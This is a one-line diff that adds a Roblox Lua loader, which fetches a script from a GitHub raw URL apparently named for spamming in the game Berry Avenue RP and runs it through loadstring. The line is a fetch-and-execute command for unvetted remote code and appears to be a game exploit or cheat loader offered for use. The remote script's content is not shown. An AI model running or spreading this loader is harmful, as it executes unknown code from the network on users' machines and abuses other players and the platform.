@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/berry-avenue-rp-spam3-gzy468dyocqjbo.lua"))()
